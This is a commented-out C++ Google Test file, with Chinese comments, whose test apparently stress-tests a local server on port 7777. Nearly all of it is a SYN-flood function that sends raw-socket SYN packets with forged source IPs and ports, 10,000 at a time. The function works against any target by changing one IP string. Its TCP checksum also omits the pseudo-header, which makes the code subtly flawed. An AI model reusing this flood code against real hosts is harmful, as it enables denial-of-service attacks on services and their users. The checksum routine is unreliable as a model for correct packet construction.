// #include <gtest/gtest.h>
// #include <iostream>
// #include <cstring>
// #include <cstdlib>
// #include <sys/socket.h>
// #include <netinet/ip.h>
// #include <netinet/tcp.h>
// #include <arpa/inet.h>
// #include <unistd.h>
// #include <random>

// #define ATK_NUM 10000
// // 校验和计算
// unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
//     unsigned long sum;
//     unsigned short oddbyte;
//     unsigned short answer;

//     sum = 0;
//     while (nbytes > 1) {
//         sum += *ptr++;
//         nbytes -= 2;
//     }

//     if (nbytes == 1) {
//         oddbyte = 0;
//         *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
//         sum += oddbyte;
//     }

//     sum = (sum >> 16) + (sum & 0xffff);
//     sum += (sum >> 16);
//     answer = (unsigned short)~sum;

//     return answer;
// }

// void syn_flood(const char *target_ip, int target_port, int num_packets) {
//     // 创建原始套接字
//     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
//     if (sock < 0) {
//         perror("Socket creation failed");
//         exit(EXIT_FAILURE);
//     }

//     // 设置套接字选项以自己构造 IP 头部
//     int optval = 1;
//     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0) {
//         perror("Error setting IP_HDRINCL");
//         close(sock);
//         exit(EXIT_FAILURE);
//     }

//     char packet[4096];
//     struct sockaddr_in target_addr;

//     // 目标地址结构
//     target_addr.sin_family = AF_INET;
//     target_addr.sin_port = htons(target_port);
//     inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

//     // 随机数生成器用于伪造源 IP 和端口
//     std::random_device rd;
//     std::mt19937 gen(rd());
//     std::uniform_int_distribution<> ip_dist(1, 254);
//     std::uniform_int_distribution<> port_dist(1024, 65535);

//     for (int i = 0; i < num_packets; ++i) {
//         // 清空包
//         memset(packet, 0, sizeof(packet));

//         // IP 头部
//         struct iphdr *ip_header = (struct iphdr *)packet;
//         ip_header->version = 4;
//         ip_header->ihl = 5;
//         ip_header->tos = 0;
//         ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
//         ip_header->id = htons(rand() % 65535);
//         ip_header->frag_off = 0;
//         ip_header->ttl = 64;
//         ip_header->protocol = IPPROTO_TCP;
//         ip_header->saddr = htonl((192 << 24) | (168 << 16) | (ip_dist(gen) << 8) | ip_dist(gen)); // 伪造源 IP
//         ip_header->daddr = target_addr.sin_addr.s_addr;

//         // TCP 头部
//         struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
//         tcp_header->source = htons(port_dist(gen)); // 伪造源端口
//         tcp_header->dest = htons(target_port);
//         tcp_header->seq = htonl(0);
//         tcp_header->ack_seq = 0;
//         tcp_header->doff = 5; // TCP 头部长度
//         tcp_header->syn = 1;
//         tcp_header->window = htons(5840);
//         tcp_header->check = 0;
//         tcp_header->urg_ptr = 0;

//         // 计算校验和
//         tcp_header->check = calculate_checksum((unsigned short *)tcp_header, sizeof(struct tcphdr));

//         // 发送包
//         if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
//                    (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
//             perror("Packet send failed");
//         } else {
//             std::cout << "Packet " << i + 1 << " sent to " << target_ip << ":" << target_port << std::endl;
//         }
//     }

//     close(sock);
// }
// TEST(SYN_ATACK, SYN_FLOOD) {
//     const char *target_ip = "127.0.0.1";
//     int target_port = 7777;

//     std::cout << "Starting SYN flood attack on " << target_ip << ":" << target_port << "..." << std::endl;
//     syn_flood(target_ip, target_port, ATK_NUM);
// }
